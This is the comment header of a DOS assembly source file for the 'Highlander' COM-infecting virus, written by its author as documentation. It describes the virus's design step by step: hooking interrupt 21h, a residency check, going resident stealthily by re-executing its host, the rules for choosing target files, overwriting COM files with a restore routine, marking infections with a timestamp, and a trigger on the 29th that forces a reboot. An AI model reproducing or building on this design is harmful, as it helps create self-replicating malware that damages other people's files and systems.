;HIGHLAND.COM

;This is the HIGHLANDER Virus version 1.0.  

;This virus is a generic, parasitic, resident COM infector.  It will not
;infect command.com however.  It is not destructive but can be irritating.
;Interrupt 21 is hooked.

;This virus is to be assembled under TASM 2.0 with the /m2 switch.

;When an infected file is executed, the virus code is executed first.
;The virus first checks to see if the virus is already resident.  It does
;this by setting the AH register to 0DEh.  This subfunction is currently
;unsupported by DOS.  Interrupt 21 is then called.  If after the call, AH is 
;unchanged, the virus is not resident.  If AH no longer contains 0DEh, the
;virus is assumed to be resident (If the virus is resident, AH will actually
;be changed to 0EDh.  This is never checked for, only a change from 0DEh
;is checked for).  If the virus is already resident, the executing viral
;code will restore the host in memory to original condition and allow it
;to execute normally.  If however, the virus is not resident, Interrupt 21
;will then be trapped by the virus.  Once this is accomplished, the virus
;will free all available memory that it does not need (COM programs are
;allocated all available memory when they are executed even though they can
;only occupy one segment).  The viral code will then copy the original 
;environment and determine the path and filename of the host program in 
;memory.  The viral code will then shell out and re-execute the host 
;program.  The virus is nearly resident now.  When the virus shells out
;and re-executes the host, a non-supported value is passed in the AL
;register.  This is interpreted by the virus to mean that the infection
;is in transition and that when the host is re-executed, to assume that the
;virus is already resident.  This value is then changed to the proper value
;so that the shell process will execute normally (INT 21 is already trapped
;at this point).  This shell process is invisible, since the viral code
;so successfully copies the original environment.  Once the host has 
;finished executing, control is then returned back to the original host
;(the viral code).  The virus then completes execution by going resident
;using interrupt 027h.  In all appearances, the host program has just 
;completed normal execution and has terminated.  In actuality, the virus
;is now fully resident.

;When the virus is resident, interrupt 021h is trapped and monitored.
;When a program is executed, the resident virus gets control (DOS executes
;programs by shelling from DOS using interrupt 021h, subfunction 04bh).
;When the virus sees that a program is being executed, a series of checks
;are performed.  The first thing checked for is whether or not the program
;to be executed has 'D' as the seventh letter in the filename.  If it does
;the program is not infected and is allowed to execute normally (this is
;how the virus keeps from infecting COMMAND.COM.  No COM file with a 'D'
;as the seventh letter will be infected).  If there is no 'D' as the seventh
;letter, the virus then checks to see if the program to be executed is a
;COM file or not.  If it is not a COM file, it is not infected and allowed
;to execute normally.  If the COM file test is passed, the file size is then
;checked.  Files are only infected if they are larger than 1024 bytes and
;smaller than 62000 bytes.  If the file size is within bounds, the file
;is checked to see if it is already infected.  Files are only infected
;a single time.  The virus determines infection by checking the date/time
;stamp of the file.  If the seconds portion of the stamp is equal to 40,
;the file is assumed to be infected.  If the file is infected, the virus
;then checks the date.  If it is the 29th day of any month, the virus will
;then display its irritating qualities by displaying the message 
;'Highlander 1 RULES!' 21 times and then locking the machine and forcing
;a reboot.  If the file is not infected, infection will proceed.  The 
;virus stores the original attributes and then changes the attributes to
;normal, read/write.  The file length is also stored.  The file is then
;opened and the first part of the file is read and stored in memory (the
;exact number of bytes is the same length as the virus).  The virus then
;proceeds to overwrite the first part of the file with its own code.  The 
;file pointer is then adjusted to the end of the file and a short 
;restoration routine is copied.  The original first part of the file is 
;then copied to the end of the file after the restore routine.  The files
;time/date stamp is then adjusted to show an infection (the seconds portion
;of the time is set to 40.  This will normally never be noticed since 
;directory listings never show the seconds portion).  The file is then
;closed and the original attributes are restored.  Control is then passed
;to the original INT 021h routine and the now infected program is allowed
;to execute normally.

;This virus will infect read-only files.
;COMMAND.COM will not be infected.
;It is not destructive but can be highly irritating.
